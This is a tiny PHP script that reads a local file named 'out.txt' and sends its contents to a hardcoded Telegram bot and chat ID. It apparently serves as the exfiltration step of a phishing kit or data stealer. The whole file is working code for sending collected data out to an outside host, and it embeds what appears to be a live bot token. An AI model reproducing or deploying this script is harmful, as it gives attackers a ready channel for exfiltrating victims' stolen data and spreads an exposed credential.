<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot7540301784:AAHaqrNISOJc2XlV1EgUwP4Vwtiphws5v94/sendMessage?chat_id=7239544191&text=$msg");
?>
